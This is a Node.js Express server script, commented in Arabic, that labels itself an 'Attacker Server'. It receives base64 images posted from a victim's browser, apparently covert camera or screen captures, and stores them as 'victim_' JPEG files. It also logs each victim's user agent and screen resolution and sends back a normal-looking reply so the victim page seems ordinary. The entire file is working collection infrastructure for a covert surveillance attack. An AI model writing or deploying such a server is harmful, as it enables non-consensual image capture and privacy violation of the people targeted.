const express = require('express');
const fs = require('fs');
const path = require('path');

// إنشاء تطبيق Express
const app = express();
const PORT = 3000;

// تحديد مجلد الحفظ
const captureDir = path.join(__dirname, 'captures');

// إنشاء مجلد الحفظ إذا لم يكن موجودًا
if (!fs.existsSync(captureDir)) {
    fs.mkdirSync(captureDir);
}

// إعداد Express لاستقبال البيانات المرسلة
app.use(express.json({ limit: '50mb' }));

// مسار (Route) لاستقبال الصور
app.post('/capture', (req, res) => {
    // استخراج البيانات من الطلب
    const { image, userAgent, screenResolution, timestamp } = req.body;
    
    // التحقق من وجود الصورة
    if (!image) {
        return res.status(400).json({ error: 'No image provided' });
    }

    // إزالة ترويسة Data URL (مثل data:image/jpeg;base64,)
    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
    
    // تسمية الملف بالوقت الحالي
    const fileName = `victim_${Date.now()}.jpg`;
    const filePath = path.join(captureDir, fileName);

    try {
        // كتابة الصورة على القرص
        fs.writeFileSync(filePath, base64Data, 'base64');
        
        // تسجيل البيانات في ملف نصي (Log)
        const logEntry = `${timestamp} - User-Agent: ${userAgent} - Resolution: ${screenResolution}\n`;
        fs.appendFileSync(path.join(captureDir, 'logs.txt'), logEntry);

        // رسالة في Terminal للمهاجم
        console.log(`[+] New capture saved: ${filePath}`);
        
        // رد للضحية (لتبدو الصفحة طبيعية)
        res.json({ status: 'success' });
    } catch (err) {
        console.error("Error saving image:", err);
        res.status(500).json({ error: 'Failed to save image' });
    }
});

// تشغيل الخادم
app.listen(PORT, () => {
    console.log(`[!] Attacker Server running on http://localhost:${PORT}`);
    console.log(`[!] Captures will be saved in: ${captureDir}`);
});
